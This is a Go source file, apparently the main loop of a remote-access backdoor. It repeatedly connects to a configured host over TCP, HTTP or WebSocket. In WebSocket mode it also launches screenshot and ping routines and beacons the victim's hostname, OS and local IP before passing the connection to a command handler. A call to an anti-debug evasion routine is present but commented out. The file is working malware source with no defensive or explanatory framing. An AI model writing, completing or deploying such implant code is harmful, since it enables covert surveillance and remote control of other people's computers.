package main

import (
	"backdoor/config"
	"backdoor/handler"
	"backdoor/transport"
	"backdoor/utils"
	"fmt"
	"os"
	"runtime"
	"time"
)

func main() {
	// evasion.StartAntiDebugLoop()
	for {
		var conn transport.Transport
		var err error

		switch config.Mode {
		case "tcp":
			conn = transport.NewTCP(config.Host + ":" + config.Port)
		case "udp":
			//conn = transport.NewUDP(config.Host + ":" +config.Port)
		case "http":
			conn = transport.NewHTTP("http://" + config.Host + ":" + config.Port)
		case "ws":
			conn = transport.NewWebSocket("ws://" + config.Host + ":" + config.Port + "/ws")
			go handler.StartScreenshotRoutine()
			go handler.StartPingRoutine()
		}

		if conn == nil {
			time.Sleep(10 * time.Second)
			continue
		}
		if err = conn.Connect(); err != nil {
			return
		}
		if config.Mode == "ws" {
			hostname, _ := os.Hostname()
			beacon := fmt.Sprintf(`{"UUID":"%s","Hostname":"%s","OS":"%s","IP":"%s"}`,
				config.UUID, hostname, runtime.GOOS, utils.GetLocalIP())
			conn.Write([]byte(beacon))
		}

		handler.Handle(conn)
		conn.Close()
		time.Sleep(10 * time.Second)
	}
}
